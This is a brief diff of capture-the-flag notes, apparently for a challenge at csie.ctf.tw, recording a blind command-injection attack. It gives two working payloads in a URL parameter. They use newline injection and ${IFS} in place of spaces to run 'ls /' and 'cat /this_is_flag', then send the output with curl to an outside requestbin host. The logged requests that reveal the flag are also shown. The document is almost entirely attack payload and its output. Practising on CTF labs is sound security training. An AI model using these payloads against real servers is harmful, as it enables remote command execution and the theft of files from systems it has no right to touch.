@@ -1,0 +1,11 @@
+http://csie.ctf.tw:10140/
+?h=%0aA=$(ls${IFS}/)%0acurl${IFS}http://requestbin.fullcontact.com/1ny5keq1/$(echo${IFS}${A:84})
+
+http://requestbin.fullcontact.com GET /1ny5keq1/this_is_flag
+
+-------------------------------------------------------------------------------
+
+http://csie.ctf.tw:10140/
+?h=%0acurl${IFS}http://requestbin.fullcontact.com/1ny5keq1/$(echo${IFS}$(cat${IFS}/this_is_flag))
+
+http://requestbin.fullcontact.com GET /1ny5keq1/FLAGez_blind_cmd_inj
